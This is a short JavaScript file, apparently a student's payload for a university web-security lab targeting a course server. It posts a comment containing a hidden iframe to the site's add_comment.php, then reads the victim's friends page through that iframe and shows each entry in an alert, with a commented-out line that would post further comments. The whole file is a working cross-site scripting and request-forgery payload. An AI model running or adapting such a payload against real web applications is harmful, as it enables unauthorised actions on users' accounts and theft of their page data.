function moveitmoveit() {
    $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{ comment: '<iframe height="0" width="0" id="hiddenone" src="http://csec380-core.csec.rit.edu:86/friends.php"></iframe>'});
    var eff = document.getElementById("hiddenone");
    eff.addEventListener("load",function(){
       var conter= eff.contentWindow.document.body.innerHTML.match('^[^<br]*');
       var stringy = conter.join();
       var arr = stringy.split(',');
       for( var i = 0; i < arr.length; i++){
           //  $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: 131,comment: 'Boi'});
           alert(arr[i]);
        
       } 
     });
}
moveitmoveit();
